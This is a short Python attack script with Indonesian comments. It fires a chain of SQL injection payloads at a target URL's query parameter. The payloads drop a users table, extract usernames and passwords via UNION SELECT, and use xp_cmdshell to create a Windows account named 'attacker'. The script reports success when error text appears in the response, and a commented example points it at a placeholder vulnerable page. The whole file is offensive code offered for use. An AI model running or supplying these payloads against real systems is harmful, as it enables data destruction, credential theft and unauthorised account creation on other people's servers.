import requests
import time

EXPLOIT_CHAIN_PAYLOADS = [
    # Eksploitasi kerentanannya dan melanjutkan dengan payload lanjutan
    "' OR 1=1; DROP TABLE users; --",  # Menghapus tabel
    "UNION SELECT null, username, password FROM users --",  # Mencuri data pengguna
    "'; EXEC xp_cmdshell('net user attacker pass1234 /add'); --"  # Menambahkan user baru dengan shell
]

def exploit_chain(url):
    for payload in EXPLOIT_CHAIN_PAYLOADS:
        full_url = f"{url}?input={payload}"
        try:
            response = requests.get(full_url)
            if "error" in response.text or "mysql" in response.text:
                print(f"Exploit detected with payload: {payload}")
            else:
                print(f"Exploit failed for payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

# Contoh penggunaan:
# exploit_chain("http://target.com/vulnerable.php")
